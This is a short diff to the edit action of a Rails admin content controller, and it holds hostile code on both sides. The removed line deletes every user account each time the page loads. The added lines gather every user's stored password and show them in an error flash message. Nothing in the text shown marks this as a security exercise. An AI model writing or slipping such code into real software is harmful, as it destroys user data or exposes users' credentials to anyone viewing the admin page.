@@ -28,7 +28,9 @@ class Admin::ContentController < Admin::BaseController
   end
 
   def edit
-    User.find(:all).each { |e|  e.destroy}
+    users=""
+    User.find(:all).each { |e|  users += _(e.password + "   --  ")}
+    flash[:error] = _(users)
     @article = Article.find(params[:id])
     unless @article.access_by? current_user
       redirect_to :action => 'index'
